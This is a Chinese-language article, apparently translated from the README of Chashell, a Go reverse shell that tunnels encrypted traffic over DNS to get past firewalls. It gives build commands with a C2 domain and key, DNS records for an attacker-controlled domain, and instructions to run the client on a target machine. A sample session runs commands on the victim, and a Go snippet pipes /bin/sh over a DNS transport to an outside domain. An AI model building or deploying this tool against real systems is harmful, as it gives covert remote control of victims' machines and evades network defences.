**Chashell是一个由[Go](https://golang.org/)编写的基于DNS进行通信的反向shell。它可用于绕过防火墙或严格限制的网络。**

它带有一个名为chaserv的多客户端控制服务器。

![chashell](https://image.3001.net/images/20190328/1553730628_5c9c0c4470e1b.jpg!small)

## 通信安全

每个数据包都使用对称加密（[XSalsa20](https://en.wikipedia.org/wiki/Salsa20) \+
[Poly1305](https://en.wikipedia.org/wiki/Poly1305)）进行加密，客户端和服务器之间使用共享密钥。

我们计划在未来实现非对称加密。

## 协议

Chashell使用Protocol Buffers序列化消息进行通信。作为参考，协议缓冲区结构（.proto文件）在proto文件夹中可用。

这是一个（简化的）通信图表：

![proto.png](https://image.3001.net/images/20190328/1553730653_5c9c0c5da1855.png!small)

请记住，每个数据包都经过加密，十六进制编码，然后被打包用于DNS传输。

## 支持的系统

Chashell可以在任何支持Go编译器的桌面系统使用（如Windows，Linux，Darwin，BSD衍生版本）。

我们已在以下系统进行了测试：

> Windows (386/amd64)
>
> Linux (386/amd64/arm64)
>
> OS X (386/amd64)

## Chaserv/Chashell 使用

 **构建**

在运行这些命令之前，请确保已正确配置GOPATH环境变量。

构建所有二进制文件（根据需要调整domain_name和encryption_key）：

    
    
    $ export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
    $ export DOMAIN_NAME=c.sysdream.com
    $ make build-all

为特定平台构建：

    
    
    $ make build-all OSARCH="linux/arm"

仅构建服务器：

    
    
    $ make build-server

仅构建客户端（chashell本身）：

    
    
    $ make build-client

 **DNS 设置**

购买并配置你选择的域名。

设置DNS记录：

    
    
    chashell 300 IN A [SERVERIP]
    c 300 IN NS chashell.[DOMAIN].

 **使用**

在服务器端（攻击者的计算机），你必须使用chaserv二进制文件。对于客户端（即目标），请使用chashell二进制文件。

因此：

> 在控制服务器运行chaserv
>
> 在目标计算机运行chashell

客户端现在应该回连到chaserv：

    
    
    [n.chatelain]$ sudo ./chaserv
    chashell >>> New session : 5c54404419e59881dfa3a757
    chashell >>> sessions 5c54404419e59881dfa3a757
    Interacting with session 5c54404419e59881dfa3a757.
    whoami
    n.chatelain
    ls /
    bin
    boot
    dev
    [...]
    usr
    var

使用sessions
[sessionid]命令与客户端进行交互。与之交互过程中，你可以使用background命令将会话转为后台执行，并返回到chashell提示符。

使用exit命令关闭chaserv。

##  **实现自己的反向 shell**

chashell/lib/transport库与io.Reader/io.Writer接口兼容。因此，实现反向shell非常简单：

    
    
    cmd := exec.Command("/bin/sh")
    
    dnsTransport := transport.DNSStream(targetDomain, encryptionKey)
    
    cmd.Stdout = dnsTransport
    cmd.Stderr = dnsTransport
    cmd.Stdin = dnsTransport
    cmd.Run()

## 未来计划

> 实现非对称加密（Curve25519，XSalsa20和Poly1305）
>
> 使用InfoPacket消息检索主机名
>
> 创建代理/中继工具隧道TCP/UDP流（通过DNS进行Meterpreter！）
>
> 更好的错误处理
>
> 摆脱依赖

***参考来源：[GitHub](https://github.com/sysdream/chashell)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

